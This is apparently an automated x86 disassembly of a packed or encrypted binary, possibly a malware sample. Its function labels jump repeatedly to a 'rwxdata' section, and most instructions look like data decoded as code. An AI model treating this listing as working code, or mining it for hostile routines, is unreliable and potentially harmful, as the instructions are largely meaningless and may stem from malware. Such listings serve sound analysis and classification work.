sub_40142f
cmc
mov cl 0xa7
cmpsd [ esi ] [ edi ]
mov edi 0xb9626262
cmp [ ebp + 0x62 ] dl
bound ecx [ 0xffffffff9ee1b6db ]
pop edx
fld [ eax ]
sbb bl 0x70
loope rwxdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
fld [ 0xffffffffabe0d55a ]
arpl [ edx + 0x62 ] sp
adc bh [ edx ]
cmp al 0x62
cmpsd [ esi ] [ edi ]
rcr ch 0x1
bound esp [ edx + 0x62 ]
fchs
popfd
jae rwxdata
push esi
jae rwxdata
push edi
out dx eax
divps xmm3 xmm1
pop esi
je rwxdata
or dl [ edx ]
cmpsd [ esi ] [ edi ]
rol ch 0x1
bound esp [ edx + 0x62 ]
fchs
mov [ 0xffffffffba62625c ] eax
insb
bound esp [ edx + 0x62 ]
rol [ edx - 0x12 ] 0xd8
popad
bound edx [ ecx + 0x4d267921 ]
bound ecx [ eax - 0x15 ]
mov dh 0x3d
dec ecx
bound edx [ esi + 0xa ]
mov ch 0xbc
inc ebp
je rwxdata
aad 0xe5
and dh [ edx + 0x1ee9a7a7 ]
bound esp [ edx + 0x62 ]
mov bl 0xfc
pop edx
bound esp [ edx - 0x59 ]
rcr cl 0x1
bound esp [ edx + 0x62 ]
out dx eax
je rwxdata
pop es
jecxz rwxdata
lahf
pushad
mov ebx 0x8ad73ac2
lahf
bound esp [ edx - 0x4d ]
cld
and [ fs : ecx + 0x70 ] al
jo rwxdata
bound esp [ edx + 0x62 ]
sub eax 0x5ea4995e
bound edx [ eax ]
aad 0xe0
cmp ebx [ ecx + 0x62 ]
bound edx [ edx ]
aad 0xe0
sbb eax 0x12626261
cmpsd [ esi ] [ edi ]
shl [ ebp - 0x459d9d9e ] 0x1
pop edi
bound esp [ edx + 0x62 ]
das
xor esi [ edi + eax + 0x73 ]
je rwxdata
bound esp [ edi + 0x6262d9d0 ]
bound esp [ ebp - 0x11 ]
sub eax 0x67cdd9b7
stosd [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
mov [ 0xffffffffe1b6db0d ] eax
sahf
jb rwxdata
bound ebp [ esi ]
dec ebx
cmpsd [ esi ] [ edi ]
outsd
cmpsd [ esi ] [ edi ]
jb rwxdata
bound edi [ ecx + 0x62625538 ]
or eax 0x9ee1b6db
imul esp [ ebx + 0x61 ] 0x6e6f6974
jae rwxdata
outsb
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
inc edx
jae rwxdata
add [ ebx + 0x57 ] al
imul ebp [ esi + 0x4d ] 0x446e6961
outsd
arpl [ eax ] ax
fld [ ds : ebp + 0x72 ]
bound esp [ edx + 0x62 ]
mov dl 0xa7
jo rwxdata
aad 0xe5
fidiv [ edx + 0x2ee9a7a7 ]
push edi
bound esp [ edx - 0x4d ]
cld
cmpsd [ esi ] [ edi ]
jmp 0x62a27649
jb rwxdata
push edi
imul edi [ edx + 0x61 ] 0x472d6472
outsb
sub_4014ac
jns rwxdata
pop [ edi + 0x62c91975 ]
bound esp [ edx + 0x62 ]
bound eax [ edi ]
jecxz rwxdata
dec ebp
bound ecx [ eax - 0x15 ]
mov dh 0x3d
dec ecx
bound edx [ esi + 0xa ]
mov ch 0xbc
inc ebp
bound ebp [ esi ]
dec ebx
cmpsd [ esi ] [ edi ]
outsd
cmpsd [ esi ] [ edi ]
sub_401531
loop rwxdata
bound esp [ edx - 0x59 ]
xchg edx eax
frstor [ edx + 0x5e44dd57 ]
bound esp [ edx - 0x61 ]
scasb [ edi ]
pop esp
bound esp [ edx + 0x61 ]
sub eax 0xa1e8e36a
bound esp [ fs : edx - 0x59 ]
cmpsd [ esi ] [ edi ]
rol [ ebp + 0x57626262 ] 0x1
out dx eax
divps xmm3 xmm1
pop esi
je rwxdata
bound esp [ fs : edx + 0x3a ]
jno rwxdata
pop es
jecxz rwxdata
lahf
pushad
mov ebx 0x8ad73ac2
salc
bound esp [ edx - 0x2b ]
loopne rwxdata
bound ebp [ esi ]
dec ebx
cmpsd [ esi ] [ edi ]
outsd
cmpsd [ esi ] [ edi ]
aad 0xe0
popfd
bound esp [ fs : edx + 0x12 ]
cmpsd [ esi ] [ edi ]
sar cl 0x1
bound esp [ edx + 0x62 ]
lahf
bound esp [ fs : edx - 0x59 ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
mov al [ 0x625caee0 ]
bound esp [ edx - 0x45 ]
cli
loope rwxdata
outsb
cmpsb [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
push edx
jg rwxdata
popad
bound esp [ edx + 0x12 ]
sub eax 0xd6f0a777
popad
bound esp [ edx - 0x29 ]
loopne rwxdata
popad
bound esp [ edx - 0x59 ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
lahf
xlat
jb rwxdata
loopne rwxdata
push ds
test al 0xa7
cmpsd [ esi ] [ edi ]
sub eax 0xade8e271
pop esp
bound esp [ edx + 0x61 ]
cmpsd [ esi ] [ edi ]
bound esp [ edx + 0x62 ]
bound esp [ eax + 0x625aeae0 ]
bound esp [ ecx - 0x1e ]
call 0x62a27237
popad
push edi
fstp st2
bound esp [ edx + 0x62 ]
jecxz rwxdata
popad
bound esp [ edx - 0x61 ]
loopne rwxdata
bound esp [ edx - 0x60 ]
loopne rwxdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
inc ebx
cmp esi [ ebx ]
sub eax 0x72dd9f53
lodsb [ esi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
xor ah [ cs : ebp - 0x60 ]
loopne rwxdata
loopne rwxdata
pop edx
bound esp [ edx + 0x61 ]
loop rwxdata
sub eax 0xd6e8e37a
popad
bound esp [ edx - 0x59 ]
sub eax 0xa1f0a750
bound esp [ fs : edx - 0x29 ]
call 0x62a2724c
popad
pop esp
bound esp [ edx + 0x64 ]
mov ebx 0x72dd9f51
lodsb [ esi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
inc ebx
cmp esi [ ebx ]
mov al [ gs : 0x625cb7e0 ]
bound esp [ ecx - 0x59 ]
in eax dx
jb rwxdata
fstp [ esi ]
test al 0xa7
bound esp [ edi - 0x60585859 ]
scasb [ edi ]
pop esp
bound esp [ edx + 0x61 ]
push eax
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
aad 0xdd
sbb eax 0x12a7a7a5
adc [ edi + 0x625cb0d0 ] ah
sub_401939
cmpsd [ esi ] [ edi ]
rcr [ ebp + 0x61 ] 0x1
push edx
bound esp [ edx - 0x59 ]
sub eax 0xa7623caa
adc [ ecx + 0x2da7aadb ] al
stosb [ edi ]
adc ah [ edi + 0x623ca62d ]
adc [ edi + 0x6262bdd0 ] ah
bound ebx [ ebx - 0x5e ]
sub eax 0xe2623a55
bound esp [ edx + 0x3c ]
bound ecx [ edi ]
cmpsd [ esi ] [ edi ]
adc [ ebp - 0x45 ] bh
jo rwxdata
push edx
sub eax 0xa70f07ba
sub eax 0x81e0d7a6
popad
bound esp [ edx + 0x10 ]
cmpsd [ esi ] [ edi ]
pop [ edi ]
cmp ah [ edx - 0x1e ]
bound esp [ edx + 0x3c ]
bound esp [ edx - 0x1d ]
lahf
push edx
jecxz rwxdata
pop ebp
popad
fist [ 0xffffffffe0d510aa ]
cmp ebx [ ecx + 0x62 ]
bound edx [ edx ]
cmpsb [ esi ] [ edi ]
cmp al 0x62
adc [ edi + 0x6262bdd0 ] ah
popad
bound esp [ edx + 0x62 ]
bound esp [ edx + 0x62 ]
cmpsd [ esi ] [ edi ]
in eax dx
outsb
cmpsb [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
sar ch 0x1
bound esp [ edx + 0x62 ]
jecxz rwxdata
bound ecx [ edi ]
cmpsd [ esi ] [ edi ]
adc [ ebp - 0x59 ] bh
sub eax 0x5910a7a6
lahf
loopne rwxdata
push ds
test al 0xa7
cmpsd [ esi ] [ edi ]
popad
mov ecx 0xa7a7abb3
cdq
movsb [ edi ] [ esi ]
pop esi
bound ecx [ 0xf10b6db ]
fld [ 0x5225db5a ]
fist [ 0x73947356 ]
mov [ 0xffffffffa0e360dc ] al
popad
imul ebx [ esi + ebp - 0x1c4d9ca4 ] 0xffffffa0
arpl bx sp
movsb [ edi ] [ esi ]
popad
mov ebx 0xe39adbb5
test eax 0xdc572e62
pushad
ficomp [ edi - 0x1d ]
mov al [ 0x619fe361 ]
jecxz rwxdata
fstp [ esi ]
popad
mov ebx 0x625fa0b6
push edi
sub_401add
pushad
arpl [ 0xffffffff87dbcf56 ] bx
pcmpeqb mm4 [ edx + 0x8a52df8 ]
jpo rwxdata
dec edx
arpl [ 0xffffffffd960db56 ] bp
sbb eax 0x5ea0e3b6
aad 0x25
stosb [ edi ]
cmc
arpl [ 0x1dd9fb56 ] bx
stosb [ edi ]
cmc
arpl [ 0xffffffffd9fb1256 ] bx
sbb eax 0x6360dbae
sbb eax 0xb21dd956
or [ edi + 0x6262a61d ] bl
bound esp [ edx - 0x25 ]
sbb eax 0xb61d69a6
adc al 0xa6
jae rwxdata
bound esp [ ebx + 0x2d ]
push esi
sbb ebx ebx
xchg ecx eax
jae rwxdata
jae rwxdata
jae rwxdata
div [ ecx - 0x24 ]
xchg ebp eax
fdivr [ esp + ebx * 8 + 0x405af090 ]
xchg ecx eax
mov ebx 0x338a9140
pop ecx
inc eax
insd
and bl 0x40
loope rwxdata
inc edi
aad 0xdd
mov dh 0xa8
cmpsd [ esi ] [ edi ]
aam 0xe8
bound sp [ edx + 0x62 ]
sub eax 0x9a2735b
or al 0x7
or ecx [ eax ]
cdq
movsb [ edi ] [ esi ]
push esi
bound edx [ eax ]
bound esp [ edx + 0x62 ]
fistp [ 0xffffffffb61d69a6 ]
0x2d98a8b5 0x73bb
cmpsd [ esi ] [ edi ]
inc edx
fld [ 0xffffffffaedd9f5a ]
test al 0xa7
cmpsd [ esi ] [ edi ]
popad
bound esp [ edx + 0x62 ]
cmpsd [ esi ] [ edi ]
sub eax 0xaaddd752
test al 0xa7
cmpsd [ esi ] [ edi ]
lahf
fnsave [ esi - 0x11585858 ]
bound esi [ eax ]
dec eax
cmp al 0x62
mov ebx 0xe39adbb5
test eax 0xdc572e62
pushad
ficomp [ edi - 0x1d ]
mov al [ 0x619fe361 ]
jecxz rwxdata
fstp [ 0xffffffffa61dd9aa ]
jecxz rwxdata
bound esp [ edx + 0x62 ]
lahf
fnsave [ edx + 0x62a7a7a8 ]
bound esp [ edx + 0x62 ]
jae rwxdata
out dx al
popad
and eax 0xa273415f
cdq
movsb [ edi ] [ esi ]
dec esi
bound esp [ ecx + 0x1d ]
dec esi
popad
sbb eax 0x4a1d79aa
jecxz rwxdata
fstp [ esi ]
test al 0xa7
cmpsd [ esi ] [ edi ]
popad
mov ecx 0xa7a7abb3
cdq
movsb [ edi ] [ esi ]
pop esi
bound ecx [ 0xf10b6db ]
fld [ 0x5225db5a ]
fist [ 0x73947356 ]
mov [ 0xffffffffa0e360dc ] al
popad
imul ebx [ esi + ebp - 0x1c4d9ca4 ] 0xffffffa0
arpl bx sp
movsb [ edi ] [ esi ]
popad
popad
mov ebx 0x625fa0b6
push edi
cmpsd [ esi ] [ edi ]
sub eax 0x4e2da74a
cmpsd [ esi ] [ edi ]
sub eax 0x5625e352
bound ebp [ 0x5110a75d ]
mov ebx 0x5510a763
jecxz rwxdata
cmpsd [ esi ] [ edi ]
adc bh [ edx ]
cmp al 0x62
aad 0xdd
scasb [ edi ]
test al 0xa7
cmpsd [ esi ] [ edi ]
adc bh [ edx ]
cmpsd [ esi ] [ edi ]
ror cl 0x1
bound esp [ edx + 0x62 ]
jecxz rwxdata
push esi
bound ebp [ 0xffffffffb6ddd547 ]
test al 0xa7
arpl [ 0x6360db56 ] bp
sbb eax 0x2a32db56
jecxz rwxdata
dec edx
bound ebp [ 0x1ddb41ff ]
stosb [ edi ]
cdq
movsb [ edi ] [ esi ]
dec esi
bound ecx [ 0xffffffff9ee3b6db ]
mov dh 0x10
adc ecx [ edi ]
adc al 0x11
fistp [ 0xffffffffd4947352 ]
call 0x62a27cf1
sub_401d05
xor eax 0x229de352
fistp [ edi - 0x25 ]
divps xmm6 [ ebx + 0x1d ]
bound esi [ ebx + 0xd ]
pop esi
fldenv [ eax - 0x27 ]
adc [ esi - 0x25 ] bl
pop ds
pop edx
fisttp [ edi ]
push esi
jae rwxdata
arpl bx bx
push ds
jle rwxdata
pop edx
jae rwxdata
bound esp [ edx - 0x1d ]
popfd
pop edx
fild [ edi + 0x2d61bce2 ]
test ebx ebx
pushad
fisttp [ eax ]
pop esi
fistp [ eax ]
pop edx
fist [ eax ]
push esi
jae rwxdata
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
bound esp [ edx - 0x1d ]
popfd
pop edx
fild [ edi + 0x6e7e1edb ]
fistp [ esi ]
jle rwxdata
push esi
fldenv [ eax ]
pop edx
fst [ eax ]
push esi
aad 0x28
pop edx
jecxz rwxdata
inc edx
cmpsb [ esi ] [ edi ]
pop edx
jae rwxdata
sub eax 0x5235db5a
loope rwxdata
jno rwxdata
fcmovne st2
push ecx
popad
bound esp [ edx - 0x10 ]
arpl sp si
push edx
or eax 0xd958d95e
push esi
popfd
and ah [ ecx + 0x62 ]
fild [ edi + 0x6e7e1edb ]
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
push esi
jecxz rwxdata
adc [ esi - 0x27 ] bl
and [ edx - 0x27 ] bl
or [ esi + 0x41 ] dl
cdq
movsb [ edi ] [ esi ]
push edx
bound ecx [ 0xffffffffa642b6db ]
bound esi [ ebx + 0xd ]
pop esi
scasd [ edi ]
fistp [ esi ]
jle rwxdata
popad
sub eax 0xdb63f4fd
push ds
jle rwxdata
popfd
push edx
loop rwxdata
jae rwxdata
or [ esi - 0x25 ] bl
sbb [ edx - 0x25 ] bl
adc [ esi + 0x73 ] dl
sbb eax 0x5605735a
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
bound esp [ edx - 0x1d ]
popfd
pop edx
fild [ edi + 0x2d61bce2 ]
test ebx ebx
pushad
fist [ 0x621d8356 ]
pop ebx
sbb [ esi + 0x57 ] dl
0x915a1873 0xd9a2
sbb [ edx + 0x57 ] bl
0x735a1583 0x5e20
push edi
cdq
fldenv [ eax ]
pop esi
xchg ecx eax
mov eax [ 0x575e1d5b ]
cdq
jno rwxdata
orps xmm6 [ ebx + 0x1d ]
pop edx
jae rwxdata
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
bound esp [ edx - 0x1d ]
popfd
pop edx
fistp [ esi ]
jle rwxdata
push esi
fldenv [ eax ]
pop edx
fst [ eax ]
push esi
aad 0x28
pop edx
jecxz rwxdata
fcmovne st2
push ecx
popad
bound esp [ edx - 0x10 ]
arpl sp si
arpl bx bx
push ds
jle rwxdata
fstp [ eax - 0x27 ]
pop edx
bound esp [ edx - 0x1d ]
mov ch 0x5a
fild [ edi + 0x2d61bce2 ]
test ebx ebx
pushad
fisttp [ eax ]
pop esi
fistp [ eax ]
pop edx
fist [ eax ]
push esi
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
jae rwxdata
bound esi [ ebx + 0x5 ]
pop esi
pop edx
jno rwxdata
pop edx
jno rwxdata
bound ecx [ edi - 0x70a5655f ]
xchg edx eax
mov [ 0xffffffff8f5a9aa1 ] al
xchg edx eax
0x9aa19e92 0x8f5a
jno rwxdata
stosb [ edi ]
jae rwxdata
fild [ edi + 0x6e7e1edb ]
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
push esi
jecxz rwxdata
0x9aa18f5a 0xdc5a
0x9aa19674 0x7452
0xb9dc9674 0x7340
mov eax [ 0x4052a2a1 ]
jae rwxdata
pop esi
mov eax [ 0x5f715aa2 ]
loopne rwxdata
mov eax [ 0x5f715aa2 ]
mov eax [ 0x1f715aa2 ]
cdq
movsb [ edi ] [ esi ]
push edx
cmpsb [ esi ] [ edi ]
bound esp [ edx - 0x1d ]
mov ch 0x5a
fild [ edi + 0x6e7e1edb ]
push edx
loop rwxdata
jno rwxdata
je rwxdata
pop esi
pop edx
retn 0x5fd9
scasd [ edi ]
fistp [ esi ]
jle rwxdata
popad
sub eax 0xdb63f4fd
push ds
jle rwxdata
pop edi
jecxz rwxdata
jno rwxdata
jae rwxdata
mov eax [ 0xffffffff9a74529a ]
je rwxdata
jae rwxdata
or [ esi - 0x25 ] bl
sbb [ edx - 0x25 ] bl
adc [ esi + 0x73 ] dl
sbb eax 0x5e057362
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
bound esp [ edx - 0x1d ]
mov ch 0x5a
fild [ edi + 0x2d61bce2 ]
test ebx ebx
pushad
fist [ 0x621d83a6 ]
pop ebx
sbb [ esi + 0x57 ] dl
0x915a1873 0xd9a2
sbb [ edx + 0x57 ] bl
0x73aa1583 0x5e20
push edi
cdq
fldenv [ eax ]
pop esi
xchg ecx eax
mov eax [ 0x575e1d5b ]
cdq
jno rwxdata
pop edx
jno rwxdata
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
bound esp [ edx - 0x1d ]
mov ch 0x5a
popad
jecxz rwxdata
movsb [ edi ] [ esi ]
jecxz rwxdata
pop esi
mov [ 0xffffffffdb6219d5 ] eax
fstp [ eax - 0x27 ]
adc [ esi - 0x27 ] bl
and [ edx - 0x27 ] bl
or [ esi + 0x41 ] dl
adc eax 0xa60d73aa
fdivr [ ecx - 0x5e5e8cc0 ]
adc dl [ ebx + 0x5e1fd9c2 ]
or dh [ eax - 0x7d5e1d77 ]
xchg ebx eax
mov edx 0x9a575f73
fstp [ edi - 0x1d ]
jno rwxdata
xchg ebx eax
retn 0x1fd9
arpl bx bx
pop esi
rcl [ edi - 0x66 ] 0x1
fstp [ edi ]
pop esi
mov [ 0xffffffffb676e432 ] eax
jg rwxdata
mov [ 0xffffffffa1734052 ] al
0x749adc5a 0xa196
0x749a7452 0xdc96
mov ecx 0xa1a17340
arpl bx bx
pop esi
loopne rwxdata
inc edi
and esp [ cs : ecx - 0x5b24a244 ]
jecxz rwxdata
pushfd
jecxz rwxdata
sbb [ edx - 0x25 ] esp
arpl bx bx
pop esi
rcl [ ebx + 0x5e1f73ba ] 0x1
push edi
0xbb5e1fd9 0xa145
mov esp 0xe39cdb5d
shl [ ebx - 0x25 ] 0x5e
fcom [ edi - 0x66 ]
fstp [ edi - 0x1d ]
movsb [ edi ] [ esi ]
mov ebp 0x6d0fddbe
pop edi
jecxz rwxdata
pop edx
arpl bx bx
pop esi
mov esp 0x8321f856
mov bh 0x3b
rcr [ 0xffffffffb581fd49 ] cl
pop eax
pop ss
sbb [ ebp + 0x3d ] al
aam 0xe5
loopne rwxdata
not edi
mov ebx 0x72689847
xchg [ edi ] al
or [ ebp - 0x3effb3a5 ] bl
imul ebx [ ebp + ecx * 4 - 0x769afae1 ] 0x11900c61
adc [ esi ] dh
adc eax 0x40cc55db
stosd [ edi ]
xchg esi eax
rwxdata
popad
jecxz rwxdata
sar [ esi + 0x5a ] 0x1
mov edx 0x39a642fa
adc bh ah
xchg edx eax
add ah [ 0xffffffffcf44d901 ]
push cs
or ecx [ eax - 0x33 ]
retn 0x3ea7
push esp
jpo rwxdata
movsb [ edi ] [ esi ]
mov dl 0xf1
fmulp st1
xchg [ esi ] edx
fwait
movsb [ edi ] [ esi ]
outsb
sub [ eax ] dh
pop ebp
xor eax 0x9171f9ef
dec edi
pop esi
sub_401df1
xor eax 0x229de152
popad
bound esp [ edx - 0x25 ]
pop edi
fisttp [ edi ]
pop esi
jae rwxdata
pop edx
jecxz rwxdata
bound esi [ ebx + 0xd ]
pop esi
fldenv [ eax - 0x27 ]
adc [ esi - 0x25 ] bl
pop ds
pop edx
fisttp [ edi ]
push esi
jae rwxdata
fstp [ eax - 0x27 ]
adc [ esi - 0x27 ] bl
and [ edx - 0x27 ] bl
or [ esi + 0x41 ] dl
cdq
movsb [ edi ] [ esi ]
push edx
bound ecx [ 0xffffffffa642b6db ]
pop edx
arpl bx bx
push ds
jle rwxdata
pop edx
jae rwxdata
fcmovne st2
push ecx
popad
bound esp [ edx - 0x10 ]
arpl sp si
bound esp [ edx - 0x1d ]
mov ch 0x5a
fild [ edi + 0x2d61bce2 ]
test ebx ebx
pushad
fisttp [ eax ]
pop esi
fistp [ eax ]
pop edx
fist [ eax ]
push esi
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
fistp [ esi ]
jle rwxdata
push esi
fldenv [ eax ]
pop edx
fst [ eax ]
push esi
aad 0x28
jae rwxdata
bound esi [ ebx + 0x5 ]
pop esi
pop edx
jno rwxdata
pop edx
jno rwxdata
bound ecx [ edi - 0x70a5655f ]
xchg edx eax
mov [ 0xffffffff8f5a9aa1 ] al
xchg edx eax
0x9aa19e92 0x8f5a
jno rwxdata
stosb [ edi ]
jae rwxdata
fild [ edi + 0x6e7e1edb ]
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
push esi
jecxz rwxdata
0x9aa18f5a 0xdc5a
0x9aa19674 0x7452
0xb9dc9674 0x7340
mov eax [ 0x4052a2a1 ]
jae rwxdata
pop esi
mov eax [ 0x5f715aa2 ]
loopne rwxdata
mov eax [ 0x5f715aa2 ]
mov eax [ 0x1f715aa2 ]
cdq
movsb [ edi ] [ esi ]
push edx
cmpsb [ esi ] [ edi ]
bound esp [ edx - 0x1d ]
mov ch 0x5a
fild [ edi + 0x6e7e1edb ]
push edx
loop rwxdata
jno rwxdata
je rwxdata
pop esi
pop edx
retn 0x5fd9
scasd [ edi ]
fistp [ esi ]
jle rwxdata
popad
sub eax 0xdb63f4fd
push ds
jle rwxdata
pop edi
jecxz rwxdata
jno rwxdata
jae rwxdata
mov eax [ 0xffffffff9a74529a ]
je rwxdata
jae rwxdata
or [ esi - 0x25 ] bl
sbb [ edx - 0x25 ] bl
adc [ esi + 0x73 ] dl
sbb eax 0x5e057362
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
bound esp [ edx - 0x1d ]
mov ch 0x5a
fild [ edi + 0x2d61bce2 ]
test ebx ebx
pushad
fist [ 0x621d83a6 ]
pop ebx
sbb [ esi + 0x57 ] dl
0x915a1873 0xd9a2
sbb [ edx + 0x57 ] bl
0x73aa1583 0x5e20
push edi
cdq
fldenv [ eax ]
pop esi
xchg ecx eax
mov eax [ 0x575e1d5b ]
cdq
jno rwxdata
pop edx
jno rwxdata
cmpsd [ esi ] [ edi ]
rcr [ ecx + 0x61 ] cl
bound esp [ edx - 0x1d ]
mov ch 0x5a
popad
jecxz rwxdata
movsb [ edi ] [ esi ]
jecxz rwxdata
pop esi
mov [ 0xffffffffdb6219d5 ] eax
fstp [ eax - 0x27 ]
adc [ esi - 0x27 ] bl
and [ edx - 0x27 ] bl
or [ esi + 0x41 ] dl
adc eax 0xa60d73aa
fdivr [ ecx - 0x5e5e8cc0 ]
adc dl [ ebx + 0x5e1fd9c2 ]
or dh [ eax - 0x7d5e1d77 ]
xchg ebx eax
mov edx 0x9a575f73
fstp [ edi - 0x1d ]
jno rwxdata
xchg ebx eax
retn 0x1fd9
arpl bx bx
pop esi
rcl [ edi - 0x66 ] 0x1
fstp [ edi ]
pop esi
mov [ 0xffffffffb676e432 ] eax
jg rwxdata
mov [ 0xffffffffa1734052 ] al
0x749adc5a 0xa196
0x749a7452 0xdc96
mov ecx 0xa1a17340
arpl bx bx
pop esi
loopne rwxdata
inc edi
and esp [ cs : ecx - 0x5b24a244 ]
jecxz rwxdata
pushfd
jecxz rwxdata
sbb [ edx - 0x25 ] esp
arpl bx bx
pop esi
rcl [ ebx + 0x5e1f73ba ] 0x1
push edi
0xbb5e1fd9 0xa145
mov esp 0xe39cdb5d
shl [ ebx - 0x25 ] 0x5e
fcom [ edi - 0x66 ]
fstp [ edi - 0x1d ]
movsb [ edi ] [ esi ]
mov ebp 0x6d0fddbe
pop edi
jecxz rwxdata
pop edx
arpl bx bx
pop esi
mov esp 0x8321f856
mov bh 0x3b
rcr [ 0xffffffffb581fd49 ] cl
pop eax
pop ss
sbb [ ebp + 0x3d ] al
aam 0xe5
loopne rwxdata
not edi
mov ebx 0x72689847
xchg [ edi ] al
or [ ebp - 0x3effb3a5 ] bl
imul ebx [ ebp + ecx * 4 - 0x769afae1 ] 0x11900c61
adc [ esi ] dh
adc eax 0x40cc55db
stosd [ edi ]
xchg esi eax
rwxdata
popad
jecxz rwxdata
sar [ esi + 0x5a ] 0x1
mov edx 0x39a642fa
adc bh ah
xchg edx eax
add ah [ 0xffffffffcf44d901 ]
push cs
or ecx [ eax - 0x33 ]
retn 0x3ea7
push esp
jpo rwxdata
movsb [ edi ] [ esi ]
mov dl 0xf1
fmulp st1
xchg [ esi ] edx
fwait
movsb [ edi ] [ esi ]
outsb
sub [ eax ] dh
pop ebp
xor eax 0x9171f9ef
dec edi
pop esi
sub_401ed4
rcr bl cl
pushad
pop edx
jno rwxdata
bound ecx [ edi - 0x70a5655f ]
xchg edx eax
mov [ 0xffffffff8f5a9aa1 ] al
xchg edx eax
0x9aa19e92 0x8f5a
jno rwxdata
0x9aa18f5a 0xdc5a
0x9aa19674 0x7452
0xb9dc9674 0x7340
mov eax [ 0x4052a2a1 ]
jae rwxdata
pop esi
mov eax [ 0x5f715aa2 ]
jno rwxdata
loopne rwxdata
mov eax [ 0x5f715aa2 ]
mov eax [ 0x1f715aa2 ]
jno rwxdata
je rwxdata
pop esi
pop edx
retn 0x5fd9
pop edi
jecxz rwxdata
jno rwxdata
jae rwxdata
mov eax [ 0xffffffff9a74529a ]
je rwxdata
popad
jecxz rwxdata
movsb [ edi ] [ esi ]
jecxz rwxdata
pop esi
mov [ 0xffffffffdb6219d5 ] eax
jae rwxdata
bound esi [ ebx + 0x5 ]
pop esi
jae rwxdata
adc eax 0xa60d73aa
fdivr [ ecx - 0x5e5e8cc0 ]
xchg ebx eax
retn 0x1fd9
arpl bx bx
pop esi
rcl [ edi - 0x66 ] 0x1
fstp [ edi ]
pop esi
mov [ 0xffffffffb676e432 ] eax
jg rwxdata
mov [ 0xffffffffa1734052 ] al
0x749adc5a 0xa196
0x749a7452 0xdc96
mov ecx 0xa1a17340
arpl bx bx
pop esi
loopne rwxdata
inc edi
and esp [ cs : ecx - 0x5b24a244 ]
jecxz rwxdata
stosb [ edi ]
jae rwxdata
mov ebp 0x6d0fddbe
pop edi
jecxz rwxdata
pop edx
arpl bx bx
pop esi
cdq
movsb [ edi ] [ esi ]
push edx
fstp [ eax - 0x27 ]
adc [ esi - 0x27 ] bl
and [ edx - 0x27 ] bl
or [ esi + 0x41 ] dl
cmpsb [ esi ] [ edi ]
mov esp 0x8321f856
mov bh 0x3b
rcr [ 0xffffffffb581fd49 ] cl
pop eax
pop ss
sbb [ ebp + 0x3d ] al
aam 0xe5
loopne rwxdata
not edi
mov ebx 0x72689847
xchg [ edi ] al
or [ ebp - 0x3effb3a5 ] bl
imul ebx [ ebp + ecx * 4 - 0x769afae1 ] 0x11900c61
adc [ esi ] dh
adc eax 0x40cc55db
stosd [ edi ]
xchg esi eax
rwxdata
popad
jecxz rwxdata
sar [ esi + 0x5a ] 0x1
mov edx 0x39a642fa
adc bh ah
xchg edx eax
add ah [ 0xffffffffcf44d901 ]
push cs
or ecx [ eax - 0x33 ]
retn 0x3ea7
push esp
jpo rwxdata
pushfd
jecxz rwxdata
sbb [ edx - 0x25 ] esp
arpl bx bx
pop esi
rcl [ ebx + 0x5e1f73ba ] 0x1
push edi
0xbb5e1fd9 0xa145
mov esp 0xe39cdb5d
shl [ ebx - 0x25 ] 0x5e
fcom [ edi - 0x66 ]
fstp [ edi - 0x1d ]
movsb [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov dl 0xf1
fmulp st1
xchg [ esi ] edx
fwait
movsb [ edi ] [ esi ]
outsb
sub [ eax ] dh
pop ebp
xor eax 0x9171f9ef
dec edi
pop esi
sub_401f63
pop esi
or dh [ eax - 0x7d5e1d77 ]
xchg ebx eax
mov edx 0x9a575f73
fstp [ edi - 0x1d ]
sbb [ edx - 0x25 ] esp
pushfd
jecxz rwxdata
arpl bx bx
pop esi
rcl [ ebx + 0x5e1f73ba ] 0x1
push edi
0xbb5e1fd9 0xa145
mov esp 0xe39cdb5d
shl [ ebx - 0x25 ] 0x5e
fcom [ edi - 0x66 ]
fstp [ edi - 0x1d ]
movsb [ edi ] [ esi ]
popad
jecxz rwxdata
inc edi
and esp [ cs : ecx - 0x5b24a244 ]
jecxz rwxdata
xchg ebx eax
retn 0x1fd9
arpl bx bx
pop esi
rcl [ edi - 0x66 ] 0x1
fstp [ edi ]
pop esi
mov [ 0xffffffffb676e432 ] eax
jg rwxdata
pop edx
arpl bx bx
pop esi
loopne rwxdata
mov ebp 0x6d0fddbe
pop edx
retn 0x5fd9
mov esp 0x8321f856
mov bh 0x3b
rcr [ 0xffffffffb581fd49 ] cl
pop eax
pop ss
sbb [ ebp + 0x3d ] al
aam 0xe5
loopne rwxdata
not edi
mov ebx 0x72689847
xchg [ edi ] al
or [ ebp - 0x3effb3a5 ] bl
imul ebx [ ebp + ecx * 4 - 0x769afae1 ] 0x11900c61
adc [ esi ] dh
adc eax 0x40cc55db
stosd [ edi ]
xchg esi eax
rwxdata
sar [ esi + 0x5a ] 0x1
mov edx 0x39a642fa
adc bh ah
xchg edx eax
